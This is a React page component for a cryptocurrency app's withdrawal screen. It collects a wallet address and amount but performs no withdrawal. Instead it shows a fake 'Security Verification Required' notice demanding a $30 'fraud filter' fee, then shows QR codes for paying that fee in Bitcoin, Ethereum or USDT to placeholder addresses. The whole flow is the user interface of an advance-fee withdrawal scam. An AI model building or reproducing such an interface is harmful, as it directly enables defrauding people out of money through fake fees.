import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ChevronDown, AlertTriangle, Wallet, DollarSign } from 'lucide-react';
import BottomNav from '@/components/BottomNav';
import BalanceDisplay from '@/components/BalanceDisplay';
import WalletQRCode from '@/components/WalletQRCode';

interface NetworkOption {
  id: string;
  name: string;
  symbol: string;
  network: string;
  paymentAddress: string;
  icon: string;
}

const networkOptions: NetworkOption[] = [
  {
    id: 'btc',
    name: 'Bitcoin',
    symbol: 'BTC',
    network: 'Bitcoin Network',
    paymentAddress: 'bc1qpayment4fraud5filter6address7xyz',
    icon: 'https://assets.coingecko.com/coins/images/1/small/bitcoin.png',
  },
  {
    id: 'eth',
    name: 'Ethereum',
    symbol: 'ETH',
    network: 'ERC-20',
    paymentAddress: '0xPayment4Fraud5Filter6Address7XYZ89AB',
    icon: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
  },
  {
    id: 'usdt-tron',
    name: 'USDT',
    symbol: 'USDT',
    network: 'TRC-20 (TRON)',
    paymentAddress: 'TPayment4Fraud5Filter6Address7XYZ',
    icon: 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
  },
];

type WithdrawStep = 'form' | 'warning' | 'payment';

const Withdraw = () => {
  const [step, setStep] = useState<WithdrawStep>('form');
  const [walletAddress, setWalletAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [selectedNetwork, setSelectedNetwork] = useState<NetworkOption>(networkOptions[0]);
  const [isNetworkDropdownOpen, setIsNetworkDropdownOpen] = useState(false);

  const handleWithdraw = () => {
    if (walletAddress && amount) {
      setStep('warning');
    }
  };

  const handleConfirm = () => {
    setStep('payment');
  };

  const handleReset = () => {
    setStep('form');
    setWalletAddress('');
    setAmount('');
  };

  return (
    <div className="page-container">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        className="mb-2"
      >
        <h1 className="text-2xl font-bold font-display text-center text-foreground">
          Withdraw
        </h1>
      </motion.div>

      {/* Balance */}
      <BalanceDisplay />

      <AnimatePresence mode="wait">
        {step === 'form' && (
          <motion.div
            key="form"
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: 20 }}
            className="mt-6 space-y-4"
          >
            <div className="space-y-2">
              <label className="text-sm text-muted-foreground flex items-center gap-2">
                <Wallet size={16} />
                Wallet Address
              </label>
              <input
                type="text"
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
                placeholder="Enter recipient wallet address"
                className="input-crypto w-full"
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm text-muted-foreground flex items-center gap-2">
                <DollarSign size={16} />
                Amount (USDT)
              </label>
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="Enter amount to withdraw"
                className="input-crypto w-full"
              />
            </div>

            <motion.button
              whileTap={{ scale: 0.98 }}
              onClick={handleWithdraw}
              disabled={!walletAddress || !amount}
              className="btn-primary-crypto w-full mt-6 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Withdraw
            </motion.button>
          </motion.div>
        )}

        {step === 'warning' && (
          <motion.div
            key="warning"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="mt-8"
          >
            <div className="glass-card-strong p-6 text-center">
              <div className="w-16 h-16 rounded-full bg-destructive/20 flex items-center justify-center mx-auto mb-4">
                <AlertTriangle size={32} className="text-destructive" />
              </div>
              <h3 className="text-xl font-semibold text-foreground mb-2">
                Security Verification Required
              </h3>
              <p className="text-muted-foreground mb-6">
                A one-time payment of <span className="text-primary font-semibold">$30</span> is required to filter fraud and verify your withdrawal request.
              </p>

              <div className="space-y-3">
                <motion.button
                  whileTap={{ scale: 0.98 }}
                  onClick={handleConfirm}
                  className="btn-primary-crypto w-full"
                >
                  Confirm & Continue
                </motion.button>
                <button
                  onClick={handleReset}
                  className="w-full py-3 text-muted-foreground hover:text-foreground transition-colors"
                >
                  Cancel
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {step === 'payment' && (
          <motion.div
            key="payment"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="mt-6 space-y-4"
          >
            <div className="text-center mb-4">
              <p className="text-muted-foreground">Pay verification fee</p>
              <p className="text-3xl font-bold text-gradient-gold">$30.00</p>
            </div>

            {/* Network Selector */}
            <div className="relative">
              <label className="text-sm text-muted-foreground mb-2 block">Select Network</label>
              <button
                onClick={() => setIsNetworkDropdownOpen(!isNetworkDropdownOpen)}
                className="w-full glass-card p-4 flex items-center justify-between"
              >
                <div className="flex items-center gap-3">
                  <img
                    src={selectedNetwork.icon}
                    alt={selectedNetwork.name}
                    className="w-10 h-10 rounded-full"
                  />
                  <div className="text-left">
                    <p className="font-medium text-foreground">{selectedNetwork.name}</p>
                    <p className="text-sm text-muted-foreground">{selectedNetwork.network}</p>
                  </div>
                </div>
                <ChevronDown
                  size={20}
                  className={`text-muted-foreground transition-transform ${isNetworkDropdownOpen ? 'rotate-180' : ''}`}
                />
              </button>

              {isNetworkDropdownOpen && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="absolute top-full left-0 right-0 mt-2 glass-card-strong z-20 overflow-hidden"
                >
                  {networkOptions.map((network) => (
                    <button
                      key={network.id}
                      onClick={() => {
                        setSelectedNetwork(network);
                        setIsNetworkDropdownOpen(false);
                      }}
                      className={`w-full flex items-center gap-3 p-4 hover:bg-secondary transition-colors ${
                        selectedNetwork.id === network.id ? 'bg-secondary' : ''
                      }`}
                    >
                      <img
                        src={network.icon}
                        alt={network.name}
                        className="w-10 h-10 rounded-full"
                      />
                      <div className="text-left">
                        <p className="font-medium text-foreground">{network.name}</p>
                        <p className="text-sm text-muted-foreground">{network.network}</p>
                      </div>
                    </button>
                  ))}
                </motion.div>
              )}
            </div>

            {/* Payment QR Code */}
            <div className="mt-4">
              <WalletQRCode
                address={selectedNetwork.paymentAddress}
                cryptoName={`Send $30 in ${selectedNetwork.symbol}`}
              />
            </div>

            <button
              onClick={handleReset}
              className="w-full py-3 text-muted-foreground hover:text-foreground transition-colors"
            >
              Cancel
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      <BottomNav />
    </div>
  );
};

export default Withdraw;
